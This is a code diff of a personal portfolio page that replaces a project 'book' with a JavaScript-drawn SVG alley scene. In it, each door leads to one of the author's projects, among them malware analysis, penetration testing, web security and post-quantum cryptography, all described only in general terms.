+      <div style="display:grid;gap:14px;align-content:start">
+        <p class="note">Cats are a passion of mine, and this one is the reason there's a black cat walking this whole alley.</p>
+        <p class="later">Tap to pet.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<svg class="room-cat" id="room-cat" viewBox="40 520 110 125" aria-hidden="true" hidden><use href="#cat-sit-sym"/></svg>
 <script>
+/* ================= THE ALLEY: built once, then walked ================= */
 (function(){
-  var cat=document.getElementById('cat');
-  var reduce=window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-  function sit(){cat.classList.remove('walking');cat.style.transform='translate(560px,0)';cat.classList.add('sat');}
-  if(reduce){sit();}else{
-    setTimeout(function(){cat.classList.add('walking');},400);
-    cat.addEventListener('animationend',function(e){if(e.animationName==='walk')sit();});
-  }
-  // Facts only for now. Zain rewrites each page in his own words.
-  var pages=[
-    {id:null,t:'Airport Management System',w:'Sep – Dec 2024',f:'Programming',x:'A desktop app in Java with a JavaFX interface that schedules departures and landings for private, commercial and cargo planes. It loads flights from CSV, keeps them in its own queue structure, and talks to a small socket server that counts reschedules.'},
-    {id:'d-aws',t:'Zero Trust on AWS',w:'Sep – Dec 2025',f:'Cloud security and risk',x:'A team of five tested a Zero Trust risk plan against AWS’s core services, then added a Business Impact Analysis and a Business Continuity Plan aligned with ISO 22301 and NIST SP 800-34. I wrote the abstract, introduction and conclusion.'},
-    {id:'d-dna',t:'Genealogy websites and the law',w:'Sep \u2013 Dec 2025',f:'Research, law and policy',x:'A 41-page paper on DNA and family-tree sites like Ancestry and MyHeritage: how they collect genetic data, who else uses it, from scientists to police, and how the law protects it, or fails to, in the US, the UAE and eight more countries, from Hungary and China to Israel and Rwanda. I am the first author.'},
-    {id:'d-zeus',t:'Zeus banking Trojan',w:'Jan – Apr 2026',f:'Malware analysis',x:'A team of five took a Zeus/ZBot sample from MalwareBazaar and analysed it statically and dynamically: its code in Ghidra, and its behaviour inside an isolated FLARE VM sandbox.'},
-    {id:'d-zelto',t:'ZELTO HR',w:'Jan – Apr 2026',f:'Penetration testing',x:'As team lead, I built a fake HR company with my team of five (an Ubuntu server, an Android app and a Kali attacker) and broke into it. Eleven vulnerabilities, from SMS phishing and a debug-mode APK to JWT algorithm confusion, SSRF, IDOR and a printer left on its default password.'},
-    {id:'d-web',t:'Campus Lost & Found',w:'Feb – Apr 2026',f:'Web security',x:'A lost-and-found site for students, built twice in PHP and MySQL: once open to local file inclusion, SQL injection, brute force, stored XSS and IDOR, and once with every one of them fixed and re-tested in Burp Suite.'},
-    {id:null,t:'Ransomware at XYZ Corporation',w:'Jan – Apr 2026',f:'Incident response and disaster recovery',x:'A bank with offices in Dubai, London and Singapore. Ransomware encrypts 60% of its databases after the attacker sat in the network for 21 days. With a team of five, I wrote its incident response, disaster recovery and continuity plans: a 72-hour timeline, recovery moved to London, no backup trusted blindly, and notifications under GDPR, DFSA, MAS TRM and PCI-DSS.'},
-    {id:null,t:'Hybrid cipher',w:'Sep 2026 –',f:'Cryptography',x:'A cipher in C mixing Caesar and monoalphabetic blocks with a rotating key table. I built the decryption algorithm, which recovers every shift without guessing.'},
-    {id:'d-qsoc',t:'QuantumSOC',w:'Sep 2026 –',f:'SOC and post-quantum cryptography',x:'My graduation project: a testbed where a real TLS 1.3 handshake runs on ML-KEM-768 and ML-DSA-65, monitored in Splunk, to measure how ready a SOC is for quantum computers.'},
-    {id:null,t:'Cyberus Academy',w:'Sep 2026 –',f:'AI and security training',x:'At Draveron: the AI coach of a cybersecurity training platform, which writes phishing and chat attack scenarios and checks them before learners see them.'}
-  ];
-  var i=0, toc=document.getElementById('toc'), veil=document.getElementById('veil'), bookEl=document.getElementById('the-book'), lastFocus=null;
-  toc.innerHTML=pages.map(function(p,k){return '<li><button type="button" data-k="'+k+'">'+p.t+'</button></li>'}).join('');
-  function show(k){
-    i=(k+pages.length)%pages.length; var p=pages[i];
-    document.getElementById('p-when').textContent=p.w;
-    document.getElementById('p-title').textContent=p.t;
-    document.getElementById('p-field').textContent=p.f;
-    document.getElementById('p-text').textContent=p.x;
-    document.getElementById('p-num').textContent=(i+1)+' of '+pages.length;
-    toc.querySelectorAll('button').forEach(function(b){b.setAttribute('aria-current',+b.dataset.k===i?'true':'false')});
-    var r=bookEl.querySelector('.page.right'); r.classList.remove('flip'); void r.offsetWidth; if(!reduce) r.classList.add('flip');
-  }
-  function openBook(k){
-    lastFocus=document.activeElement;
-    show(typeof k==='number'?k:i);
-    // grow the book out of the old man's hands
-    var sb=document.getElementById('small-book').getBoundingClientRect();
-    veil.hidden=false;
-    var bb=bookEl.getBoundingClientRect();
-    var dx=(sb.left+sb.width/2)-(bb.left+bb.width/2), dy=(sb.top+sb.height/2)-(bb.top+bb.height/2);
-    if(!reduce&&bookEl.animate){
-      bookEl.animate([{transform:'translate('+dx+'px,'+dy+'px) scale(.04)',opacity:.4},{transform:'none',opacity:1}],{duration:650,easing:'cubic-bezier(.2,.7,.2,1)'});
-      veil.animate([{opacity:0},{opacity:1}],{duration:400});
+'use strict';
+var NS='http://www.w3.org/2000/svg';
+var W=4300, H=720, GROUND=640;
+var reduce=window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+/* Places along the alley, left to right, 2024 to 2026. */
+var PLACES=[
+  {id:'reader',   x:250,  label:'The old man',        yr:'',          kind:'reader'},
+  {id:'airport',  x:440,  label:'Airport System',     yr:'2024', k:'JAVA',              n:'Airport',       col:'#34465a'},
+  {id:'zerotrust',x:800,  label:'Zero Trust',         yr:'2025', k:'CLOUD',             n:'Zero Trust',    col:'#33494a'},
+  {id:'archive',  x:1040, label:'Genealogy & Law',    yr:'2025', k:'RESEARCH',          n:'Genealogy',     col:'#4a5a2f'},
+  {id:'zeus',     x:1300, label:'Zeus Trojan',        yr:'2026', k:'MALWARE LAB',       n:'Zeus Trojan',   col:'#4a2f4f'},
+  {id:'zelto',    x:1560, label:'ZELTO HR',           yr:'2026', k:'PENTEST',           n:'ZELTO HR',      col:'#5a2f2f', tall:1},
+  {id:'lostfound',x:1820, label:'Lost & Found',       yr:'2026', k:'WEB SECURITY',      n:'Lost & Found',  col:'#6b5a2f'},
+  {id:'ransom',   x:2060, label:'Ransomware',         yr:'2026', k:'INCIDENT RESPONSE', n:'Ransomware',    col:'#2f3048'},
+  {id:'cipher',   x:2420, label:'Hybrid Cipher',      yr:'Fall 2026', k:'CRYPTOGRAPHY', n:'Hybrid Cipher', col:'#5a4a2a'},
+  {id:'qsoc',     x:2680, label:'QuantumSOC',         yr:'Fall 2026', k:'GRADUATION',   n:'QuantumSOC',    col:'#244a52', tall:1},
+  {id:'cyberus',  x:2940, label:'Cyberus Academy',    yr:'Fall 2026', k:'DRAVERON',     n:'Cyberus',       col:'#2a3a5a'},
+  {id:'kitchen',  x:3230, label:'Kitchen',            yr:'',          k:'KITCHEN',      n:'Pastry',        kind:'shop'},
+  {id:'roof',     x:3520, label:'Rooftop',            yr:'',          k:'ROOFTOP',      n:'Up the stairs', kind:'stairs'},
+  {id:'cat',      x:3800, label:"Cat's corner",       yr:'',          k:"CAT'S CORNER", n:'BSBS',          kind:'nook'},
+  {id:'board',    x:4080, label:'Find me',            yr:'',          kind:'board'}
+];
+var byId={}; PLACES.forEach(function(p){byId[p.id]=p});
+window.ALLEY={PLACES:PLACES,byId:byId};
+
+function rnd(seed){return function(){seed=(seed*16807)%2147483647;return (seed-1)/2147483646}}
+var R=rnd(20261029);
+function esc(t){return String(t).replace(/&/g,'&amp;').replace(/</g,'&lt;')}
+
+/* ---------- drawing ---------- */
+var s=[];
+s.push('<defs>'+
+ '<radialGradient id="lamp" cx=".5" cy=".5" r=".5"><stop offset="0" stop-color="#f1b75a" stop-opacity=".7"/><stop offset="1" stop-color="#f1b75a" stop-opacity="0"/></radialGradient>'+
+ '<pattern id="mash" width="14" height="14" patternUnits="userSpaceOnUse"><rect width="14" height="14" fill="#3b2a1c"/><circle cx="7" cy="7" r="4" fill="none" stroke="#6b4c30" stroke-width="2"/><path d="M0 7h14M7 0v14" stroke="#4f3823" stroke-width="1.5"/></pattern>'+
+ '<pattern id="cob" width="44" height="22" patternUnits="userSpaceOnUse"><rect width="44" height="22" fill="#5d5242"/><rect x="2" y="2" width="40" height="8" rx="4" fill="#6c604d"/><rect x="-20" y="12" width="40" height="8" rx="4" fill="#665a48"/><rect x="24" y="12" width="40" height="8" rx="4" fill="#665a48"/></pattern>'+
+ '<pattern id="tile" width="22" height="22" patternUnits="userSpaceOnUse"><rect width="22" height="22" fill="#2f7f7a"/><path d="M11 2l9 9-9 9-9-9z" fill="#e9dcc0"/><circle cx="11" cy="11" r="2.6" fill="#b35a3c"/></pattern>'+
+ '<linearGradient id="shade" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#000" stop-opacity="0"/><stop offset="1" stop-color="#000" stop-opacity=".28"/></linearGradient>'+
+'</defs>');
+
+/* back layer: distant domes and minarets, parallax */
+var back=['<g id="back" fill="#231f36">'];
+for(var bx=-200;bx<W;bx+=260+Math.floor(R()*160)){
+  var bw=160+Math.floor(R()*220), bh=330+Math.floor(R()*60);
+  back.push('<rect x="'+bx+'" y="'+bh+'" width="'+bw+'" height="'+(GROUND-bh)+'"/>');
+  var t=R();
+  if(t<.45){var r=30+Math.floor(R()*40);back.push('<path d="M'+(bx+bw/2-r)+' '+bh+'a'+r+' '+r+' 0 0 1 '+(2*r)+' 0z"/><rect x="'+(bx+bw/2-3)+'" y="'+(bh-r-20)+'" width="6" height="20"/>')}
+  else if(t<.65){var mx=bx+bw*.7;back.push('<rect x="'+mx+'" y="'+(bh-150)+'" width="22" height="150"/><path d="M'+(mx-6)+' '+(bh-146)+'h34l-17-30z"/><rect x="'+(mx-3)+'" y="'+(bh-110)+'" width="28" height="7"/>')}
+}
+back.push('</g>');
+s.push(back.join(''));
+
+/* facades */
+var cols=['#c9b896','#bfae8a','#d2c19e','#b8a682','#c4b08c','#cbb995'];
+var x=0, fac=[];
+while(x<W){
+  var w=200+Math.floor(R()*180); if(x+w>W-80) w=W-x;
+  var top=40+Math.floor(R()*150);
+  fac.push({x:x,w:w,top:top,c:cols[Math.floor(R()*cols.length)]});
+  x+=w;
+}
+var nearDoor=function(a,b){return PLACES.some(function(p){return p.kind!=='reader'&&p.kind!=='board'&&Math.abs(p.x-(a+b)/2)<(b-a)/2+70&&a<p.x+80&&b>p.x-80})};
+fac.forEach(function(f,i){
+  s.push('<rect x="'+f.x+'" y="'+f.top+'" width="'+(f.w+1)+'" height="'+(GROUND-f.top)+'" fill="'+f.c+'"/>');
+  s.push('<rect x="'+f.x+'" y="'+f.top+'" width="'+(f.w+1)+'" height="10" fill="#a8977a"/>');
+  s.push('<path d="M'+f.x+' '+f.top+'v'+(GROUND-f.top)+'" stroke="#8f7f64" stroke-width="2" opacity=".6"/>');
+  /* masonry courses */
+  var m='';for(var y=f.top+60;y<GROUND;y+=58){m+='M'+f.x+' '+y+'h'+f.w}
+  s.push('<path d="'+m+'" stroke="#8f7f64" stroke-width="1" opacity=".35"/>');
+  /* upper windows */
+  var n=f.w>300?2:1;
+  for(var k=0;k<n;k++){
+    var wx=f.x+(k+1)*f.w/(n+1), wy=f.top+50+Math.floor(R()*40);
+    if(wy>300) continue;
+    if(Math.abs(wx-byId.lostfound.x)<150) continue;
+    var kind=R();
+    if(kind<.3){ /* mashrabiya box */
+      s.push('<rect x="'+(wx-40)+'" y="'+wy+'" width="80" height="96" fill="#3b2a1c"/><rect x="'+(wx-34)+'" y="'+(wy+6)+'" width="68" height="84" fill="url(#mash)"/><rect x="'+(wx-34)+'" y="'+(wy+6)+'" width="68" height="84" fill="#f1b75a" opacity=".14" class="glow"/><rect x="'+(wx-46)+'" y="'+(wy+94)+'" width="92" height="8" fill="#4f3823"/>');
+    } else { /* arched window with shutters, sometimes lit */
+      var lit=R()<.45;
+      s.push('<path d="M'+(wx-22)+' '+(wy+86)+'v-56a22 22 0 0 1 44 0v56z" fill="'+(lit?'#f1b75a':'#2a2440')+'"'+(lit?' class="glow"':'')+'/>');
+      s.push('<path d="M'+wx+' '+(wy+8)+'v78M'+(wx-22)+' '+(wy+46)+'h44" stroke="#3b2a1c" stroke-width="3"/>');
+      s.push('<rect x="'+(wx-40)+'" y="'+(wy+22)+'" width="16" height="64" fill="#3e6b5a"/><rect x="'+(wx+24)+'" y="'+(wy+22)+'" width="16" height="64" fill="#3e6b5a"/>');
+      s.push('<rect x="'+(wx-30)+'" y="'+(wy+86)+'" width="60" height="6" fill="#a8977a"/>');
+      if(R()<.5) s.push('<path d="M'+(wx-24)+' '+(wy+92)+'h48v14h-48z" fill="#7a4a2c"/><path d="M'+(wx-20)+' '+(wy+92)+'c4-14 10-14 12-2M'+(wx-2)+' '+(wy+92)+'c4-16 12-14 14 0M'+(wx+12)+' '+(wy+92)+'c2-10 8-12 10 0" stroke="#4f6a33" stroke-width="4" fill="none" stroke-linecap="round"/>');
     }
-    document.getElementById('close').focus();
   }
-  function closeBook(){veil.hidden=true; if(lastFocus) lastFocus.focus();}
-  toc.addEventListener('click',function(e){var b=e.target.closest('button');if(b)show(+b.dataset.k);});
-  document.getElementById('prev').addEventListener('click',function(){show(i-1)});
-  document.getElementById('next').addEventListener('click',function(){show(i+1)});
-  document.getElementById('close').addEventListener('click',closeBook);
-  veil.addEventListener('click',function(e){if(e.target===veil)closeBook();});
-  document.addEventListener('keydown',function(e){
-    if(veil.hidden)return;
-    if(e.key==='Escape')closeBook();
-    if(e.key==='ArrowRight')show(i+1);
-    if(e.key==='ArrowLeft')show(i-1);
-  });
-  var reader=document.getElementById('reader');
-  function act(fn){return function(e){if(e.type==='click'||e.key==='Enter'||e.key===' '){e.preventDefault();fn();}}}
-  reader.addEventListener('click',act(function(){openBook(0)}));
-  reader.addEventListener('keydown',act(function(){openBook(0)}));
-  document.getElementById('ask').addEventListener('click',function(){openBook(0)});
-  // the doors still work: each opens the book at its own page
-  document.querySelectorAll('.door').forEach(function(d){
-    var k=pages.findIndex(function(p){return p.id===d.id});
-    var go=act(function(){openBook(k)});
-    d.addEventListener('click',go); d.addEventListener('keydown',go);
-  });
+  s.push('<rect x="'+f.x+'" y="'+f.top+'" width="'+f.w+'" height="'+(GROUND-f.top)+'" fill="url(#shade)"/>');
+});
+
+/* string lights across the alley */
+var sl='';
+for(var lx=60;lx<W-200;lx+=520){
+  var ex=lx+460, my=150;
+  s.push('<path d="M'+lx+' 120Q'+(lx+230)+' 200 '+ex+' 120" stroke="#2b2117" stroke-width="1.5" fill="none"/>');
+  for(var b=1;b<10;b++){var tt=b/10,bx2=(1-tt)*(1-tt)*lx+2*(1-tt)*tt*(lx+230)+tt*tt*ex,by=(1-tt)*(1-tt)*120+2*(1-tt)*tt*200+tt*tt*120;
+    sl+='<circle cx="'+bx2.toFixed(1)+'" cy="'+(by+5).toFixed(1)+'" r="3.4" fill="#f6d79a" class="bulb" style="animation-delay:'+(b*.31%3).toFixed(2)+'s"/>'}
+}
+s.push('<g>'+sl+'</g>');
+
+/* the great arch over ZELTO with the name */
+var ax=byId.zelto.x;
+s.push('<path d="M'+(ax-215)+' '+GROUND+'V420a215 205 0 0 1 430 0v'+(GROUND-420)+'h-46V430a169 160 0 0 0-338 0v'+(GROUND-430)+'z" fill="#cdbd99"/>');
+s.push('<path d="M'+(ax-169)+' 430a169 160 0 0 1 338 0" fill="none" stroke="#a8977a" stroke-width="3"/>');
+s.push('<path d="M'+(ax-215)+' 420a215 205 0 0 1 430 0" fill="none" stroke="#b3a281" stroke-width="2"/>');
+var ray='';for(var a=0;a<=10;a++){var ang=Math.PI*(1-a/10),c=Math.cos(ang),sn=Math.sin(ang);ray+='M'+(ax+c*174).toFixed(1)+' '+(430-sn*165).toFixed(1)+'L'+(ax+c*210).toFixed(1)+' '+(420-sn*200).toFixed(1)}
+s.push('<path d="'+ray+'" stroke="#b3a281" stroke-width="2" opacity=".8"/>');
+s.push('<rect x="'+(ax-120)+'" y="168" width="240" height="84" fill="#bfae8a" stroke="#8f7f64" stroke-width="2"/><rect x="'+(ax-113)+'" y="175" width="226" height="70" fill="none" stroke="#a8977a"/>');
+s.push('<text x="'+ax+'" y="205" text-anchor="middle" font-family="Marcellus SC, Marcellus, Georgia, serif" font-size="30" letter-spacing="12" fill="#3a2f22">ZAIN</text>');
+s.push('<text x="'+ax+'" y="240" text-anchor="middle" font-family="Aref Ruqaa, Amiri, serif" font-size="26" fill="#4a3a28">زين</text>');
+
+/* tatreez above the Lost & Found door (Jenin style) */
+(function(){
+  var X0=byId.lostfound.x-84, Y0=262, TW=168, TH=104, S=4, g={};
+  var star=["....R.R....","...RR.RR...","..RRRGRRR..","RRRR.G.RRRR",".RR.GYG.RR.","..GGYKYGG..",".RR.GYG.RR.","RRRR.G.RRRR","..RRRGRRR..","...RR.RR...","....R.R...."];
+  var col={R:'#a3222b',K:'#2a1a1c',G:'#3e6b3a',Y:'#c99a2e',B:'#2c3f73',P:'#6a2e5e'};
+  [7,21,35].forEach(function(cx){star.forEach(function(line,r){for(var c=0;c<line.length;c++){if(line[c]!=='.')g[(cx-5+c)+','+(7+r)]=line[c]}})});
+  [14,28].forEach(function(cx){[[0,-1],[-1,0],[1,0],[0,1]].forEach(function(d){g[(cx+d[0])+','+(12+d[1])]='Y'})});
+  for(var q=0;q<42;q++){if(q%4===0||q%4===2){g[q+',4']='B';g[q+',20']='P'}if(q%4===1){g[q+',3']='B';g[q+',21']='P'}}
+  var out='<g aria-hidden="true"><path d="M'+(X0-10)+' '+(Y0-4)+'h'+(TW+20)+'" stroke="#4f3823" stroke-width="5" stroke-linecap="round"/><rect x="'+X0+'" y="'+Y0+'" width="'+TW+'" height="'+TH+'" fill="#f2ede1"/>';
+  var st=['#a3222b','#3e6b3a','#c99a2e','#2c3f73','#6a2e5e'];
+  for(var sx=X0+3,i=0;sx<X0+TW-2;sx+=9,i++) out+='<rect x="'+sx+'" y="'+Y0+'" width="2.2" height="'+TH+'" fill="'+st[i%5]+'" opacity=".55"/>';
+  out+='<rect x="'+X0+'" y="'+(Y0+22)+'" width="'+TW+'" height="50" fill="#f2ede1"/>';
+  Object.keys(col).forEach(function(kk){var d='';Object.keys(g).forEach(function(key){if(g[key]===kk){var p=key.split(',');d+='M'+(X0+p[0]*S+.6)+' '+(Y0+p[1]*S+.6)+'l2.8 2.8m0 -2.8l-2.8 2.8'}});if(d)out+='<path d="'+d+'" stroke="'+col[kk]+'" stroke-width="1.3" stroke-linecap="round" fill="none"/>'});
+  for(var t2=0;t2<5;t2++) out+='<path d="M'+(X0+12+t2*36)+' '+(Y0+TH)+'v10" stroke="'+st[t2]+'" stroke-width="2.5" stroke-linecap="round"/>';
+  s.push(out+'</g>');
+})();
+
+/* lanterns on walls */
+[150,980,2240,3100,3640].forEach(function(lx){
+  s.push('<circle cx="'+lx+'" cy="330" r="86" fill="url(#lamp)" class="flicker"/><path d="M'+(lx+38)+' 282h-38v8" stroke="#2b2117" stroke-width="4" fill="none"/><path d="M'+(lx-12)+' 292h24l6 22-6 34h-24l-6-34z" fill="#f1b75a" class="flicker"/><path d="M'+(lx-12)+' 292h24l6 22-6 34h-24l-6-34z" fill="none" stroke="#2b2117" stroke-width="3"/><path d="M'+(lx-8)+' 286h16v6h-16z" fill="#2b2117"/>');
+});
+
+/* jasmine over a couple of walls */
+[[2300,40],[3900,60]].forEach(function(j){var jx=j[0],jy=j[1];
+  s.push('<path d="M'+jx+' '+jy+'c60 20 120 0 190 30s90 60 130 40v40c-50 10-80-20-130-40s-120-10-190-30z" fill="#3f5a2a"/>');
+  var d='';for(var q=0;q<10;q++){d+='<circle cx="'+(jx+20+q*30)+'" cy="'+(jy+22+Math.sin(q)*14+q*4)+'" r="3.6" fill="#f4efe2"/>'}s.push(d);
+});
+
+/* ground */
+s.push('<rect x="0" y="'+GROUND+'" width="'+W+'" height="'+(H-GROUND)+'" fill="url(#cob)"/><path d="M0 '+GROUND+'H'+W+'" stroke="#3b3326" stroke-width="3"/>');
+/* year stones */
+[[340,'2024'],[700,'2025'],[1190,'2026'],[2300,'FALL 2026']].forEach(function(y){
+  s.push('<rect x="'+(y[0]-62)+'" y="'+(GROUND+20)+'" width="124" height="34" rx="3" fill="#7a6d58" stroke="#4a4030"/><text class="year" x="'+y[0]+'" y="'+(GROUND+45)+'" text-anchor="middle" style="font-size:'+(y[1].length>4?15:20)+'px;fill:#e2d5b8">'+y[1]+'</text>');
+});
+
+/* ---------- doors ---------- */
+function plaque(p,cx,y){
+  var w=Math.max(132,p.n.length*9.4+30, p.k.length*9.2+24);
+  return '<rect x="'+(cx-w/2)+'" y="'+y+'" width="'+w+'" height="44" fill="#d9a441" rx="2"/><rect x="'+(cx-w/2+3)+'" y="'+(y+3)+'" width="'+(w-6)+'" height="38" fill="none" stroke="#a87a2c"/>'+
+    '<text class="pk" x="'+cx+'" y="'+(y+17)+'" text-anchor="middle">'+esc(p.k)+'</text><text class="pn" x="'+cx+'" y="'+(y+35)+'" text-anchor="middle">'+esc(p.n)+'</text>';
+}
+function door(p){
+  var cx=p.x, h=p.tall?176:156, top=GROUND-h, w=100;
+  var o='<g class="door" id="d-'+p.id+'" data-id="'+p.id+'" tabindex="0" role="button" aria-label="Go into: '+esc(p.label)+'">';
+  o+='<rect class="light" x="'+(cx-70)+'" y="'+(top-60)+'" width="140" height="'+(h+60)+'" fill="url(#lamp)"/>';
+  o+='<path d="M'+(cx-w/2-12)+' '+GROUND+'V'+(top+w/2)+'a'+(w/2+12)+' '+(w/2+12)+' 0 0 1 '+(w+24)+' 0V'+GROUND+'z" fill="#a8977a"/>';
+  o+='<path d="M'+(cx-w/2)+' '+GROUND+'V'+(top+w/2)+'a'+(w/2)+' '+(w/2)+' 0 0 1 '+w+' 0V'+GROUND+'z" fill="#120f18"/>';
+  o+='<g class="leaf"><path class="frame" d="M'+(cx-w/2)+' '+GROUND+'V'+(top+w/2)+'a'+(w/2)+' '+(w/2)+' 0 0 1 '+w+' 0V'+GROUND+'z" fill="'+p.col+'" stroke="#2b2117" stroke-width="2"/>';
+  o+='<path d="M'+(cx-w/2+10)+' '+GROUND+'V'+(top+w/2+4)+'a'+(w/2-10)+' '+(w/2-10)+' 0 0 1 '+(w-20)+' 0V'+GROUND+'" fill="none" stroke="#00000033" stroke-width="2"/>';
+  o+='<path d="M'+cx+' '+(top+8)+'V'+GROUND+'" stroke="#00000033" stroke-width="2"/>';
+  o+='<circle cx="'+(cx+w/2-16)+'" cy="'+(GROUND-70)+'" r="3.6" fill="#d9a441"/><circle cx="'+(cx-w/2+16)+'" cy="'+(GROUND-70)+'" r="3.6" fill="#d9a441"/></g>';
+  o+='<rect x="'+(cx-w/2-16)+'" y="'+GROUND+'" width="'+(w+32)+'" height="8" fill="#8f7f64"/>';
+  o+=plaque(p,cx,top-58);
+  return o+'</g>';
+}
+var doorsSvg=[];
+PLACES.forEach(function(p){
+  if(p.col) doorsSvg.push(door(p));
+  else if(p.kind==='shop'){ /* kitchen: a shopfront with a lit window and steam */
+    var cx=p.x;
+    doorsSvg.push('<g class="door" id="d-'+p.id+'" data-id="'+p.id+'" tabindex="0" role="button" aria-label="Go into: Kitchen">'+
+      '<rect class="light" x="'+(cx-130)+'" y="390" width="260" height="250" fill="url(#lamp)"/>'+
+      '<path d="M'+(cx-130)+' 440h260l-14-36h-232z" fill="#7a2f2a"/><path d="M'+(cx-130)+' 440h260" stroke="#4a1d1a" stroke-width="3"/>'+
+      '<path d="M'+(cx-118)+' 440l10 12 10-12 10 12 10-12 10 12 10-12 10 12 10-12 10 12 10-12 10 12 10-12 10 12 10-12 10 12 10-12 10 12 10-12 10 12 10-12 10 12 10-12 10 12" fill="#efe4cb" stroke="none"/>'+
+      '<rect x="'+(cx-120)+'" y="474" width="140" height="120" fill="#f1b75a" class="glow"/><path d="M'+(cx-120)+' 534h140M'+(cx-50)+' 474v120" stroke="#3b2a1c" stroke-width="4"/><rect x="'+(cx-120)+'" y="474" width="140" height="120" fill="none" stroke="#3b2a1c" stroke-width="5"/>'+
+      '<g fill="#c98a4a"><circle cx="'+(cx-96)+'" cy="582" r="8"/><circle cx="'+(cx-76)+'" cy="582" r="8"/><circle cx="'+(cx-56)+'" cy="582" r="8"/><circle cx="'+(cx-86)+'" cy="570" r="8"/><circle cx="'+(cx-66)+'" cy="570" r="8"/></g>'+
+      '<g class="leaf"><path class="frame" d="M'+(cx+40)+' 640V494a40 40 0 0 1 80 0v146z" fill="#3e5a4a" stroke="#2b2117" stroke-width="2"/><circle cx="'+(cx+106)+'" cy="570" r="3.4" fill="#d9a441"/></g>'+
+      plaque(p,cx,346)+'</g>');
+  } else if(p.kind==='stairs'){ /* stairs up to the roof */
+    var sx=p.x-120, st='';
+    for(var i=0;i<9;i++) st+='<rect x="'+(sx+i*26)+'" y="'+(GROUND-18-i*18)+'" width="'+(260-i*26)+'" height="18" fill="'+(i%2?'#b8a682':'#c4b08c')+'" stroke="#8f7f64"/>';
+    doorsSvg.push('<g class="door" id="d-'+p.id+'" data-id="'+p.id+'" tabindex="0" role="button" aria-label="Go up to the rooftop">'+
+      '<rect class="light" x="'+(sx-20)+'" y="380" width="300" height="260" fill="url(#lamp)"/>'+st+
+      '<path d="M'+(sx+234)+' '+(GROUND-180)+'v-90a30 30 0 0 1 60 0v90z" fill="#120f18"/><path d="M'+(sx+20)+' '+(GROUND-40)+'L'+(sx+250)+' '+(GROUND-200)+'" stroke="#3b2a1c" stroke-width="4"/>'+
+      '<g class="leaf"><rect x="'+(sx+236)+'" y="'+(GROUND-256)+'" width="1" height="1" fill="none"/></g>'+plaque(p,p.x+20,GROUND-290)+'</g>');
+  } else if(p.kind==='nook'){ /* the cat's corner: a low arched niche with a cushion */
+    var nx=p.x;
+    doorsSvg.push('<g class="door" id="d-'+p.id+'" data-id="'+p.id+'" tabindex="0" role="button" aria-label="Go into the cat\'s corner">'+
+      '<rect class="light" x="'+(nx-90)+'" y="470" width="180" height="170" fill="url(#lamp)"/>'+
+      '<path d="M'+(nx-74)+' '+GROUND+'v-80a74 74 0 0 1 148 0v80z" fill="#a8977a"/><path d="M'+(nx-62)+' '+GROUND+'v-76a62 62 0 0 1 124 0v76z" fill="#2a2235"/>'+
+      '<g class="leaf"><ellipse cx="'+nx+'" cy="'+(GROUND-12)+'" rx="52" ry="14" fill="#7a2f2a"/><path d="M'+(nx-46)+' '+(GROUND-14)+'h92" stroke="#c99a2e" stroke-width="2" stroke-dasharray="4 4"/></g>'+
+      '<ellipse cx="'+(nx+86)+'" cy="'+(GROUND-6)+'" rx="16" ry="6" fill="#d9a441"/><text x="'+(nx+86)+'" y="'+(GROUND-3)+'" text-anchor="middle" font-family="Marcellus SC,serif" font-size="6" fill="#3a2f22">BSBS</text>'+
+      plaque(p,nx,GROUND-200)+'</g>');
+  } else if(p.kind==='board'){ /* the notice board at the end */
+    var bx3=p.x;
+    doorsSvg.push('<g id="d-board" aria-label="Notice board">'+
+      '<rect x="'+(bx3-110)+'" y="380" width="220" height="200" fill="#5a3f27" stroke="#3b2a1c" stroke-width="5"/><rect x="'+(bx3-12)+'" y="580" width="24" height="60" fill="#3b2a1c"/>'+
+      '<g transform="rotate(-3 '+bx3+' 450)"><rect x="'+(bx3-92)+'" y="398" width="184" height="160" fill="#efe4cb"/>'+
+      '<text x="'+bx3+'" y="430" text-anchor="middle" font-family="Marcellus SC,serif" font-size="15" letter-spacing="3" fill="#2b2117">FIND ME</text>'+
+      '<a href="https://www.linkedin.com/in/zain-moh" target="_blank" rel="me noopener"><text x="'+bx3+'" y="470" text-anchor="middle" font-family="IM Fell English,serif" font-size="20" fill="#6b2f2a" text-decoration="underline">LinkedIn</text></a>'+
+      '<a href="https://github.com/zainald3as" target="_blank" rel="me noopener"><text x="'+bx3+'" y="505" text-anchor="middle" font-family="IM Fell English,serif" font-size="20" fill="#6b2f2a" text-decoration="underline">GitHub</text></a>'+
+      '<text x="'+bx3+'" y="540" text-anchor="middle" font-family="Aref Ruqaa,serif" font-size="20" fill="#2b2117">زين</text></g>'+
+      '<circle cx="'+(bx3-80)+'" cy="404" r="4" fill="#a3222b"/><circle cx="'+(bx3+80)+'" cy="398" r="4" fill="#a3222b"/></g>');
+  }
+});
+s.push(doorsSvg.join(''));
+
+/* the old man on his chair, reading; his book is the index */
+s.push('<g id="reader" class="door" data-id="reader" tabindex="0" role="button" aria-label="The old man\'s book: every project from 2023 to 2026" transform="translate(30 0)">'+
+ '<circle cx="232" cy="560" r="80" fill="url(#lamp)" class="glow"/>'+
+ '<path d="M168 540v100M172 600h70M240 600v40M172 612h70" stroke="#4f3823" stroke-width="7" stroke-linecap="round"/><path d="M166 538h10v66h-10z" fill="#5a3f27"/>'+
+ '<path d="M196 600h44l10 36" stroke="#2c2a33" stroke-width="15" fill="none" stroke-linecap="round" stroke-linejoin="round"/><path d="M244 636h20" stroke="#1a1410" stroke-width="9" stroke-linecap="round"/>'+
+ '<path d="M184 536c4-24 22-32 38-30 14 2 20 16 18 34l-4 62h-52z" fill="#5b4330"/><path d="M222 548c12 10 22 14 30 14" stroke="#4a3626" stroke-width="13" fill="none" stroke-linecap="round"/>'+
+ '<circle cx="226" cy="490" r="15" fill="#c79c78"/><path d="M214 494c2 18 10 26 18 26s12-10 10-24c-8 6-20 6-28-2z" fill="#e8e2d6"/>'+
+ '<path d="M208 482c2-14 14-20 26-18 10 2 16 8 16 16-12-4-28-4-42 2z" fill="#3a3f45"/><path d="M232 478l22 2" stroke="#3a3f45" stroke-width="5" stroke-linecap="round"/><circle cx="234" cy="492" r="1.6" fill="#2b2117"/>'+
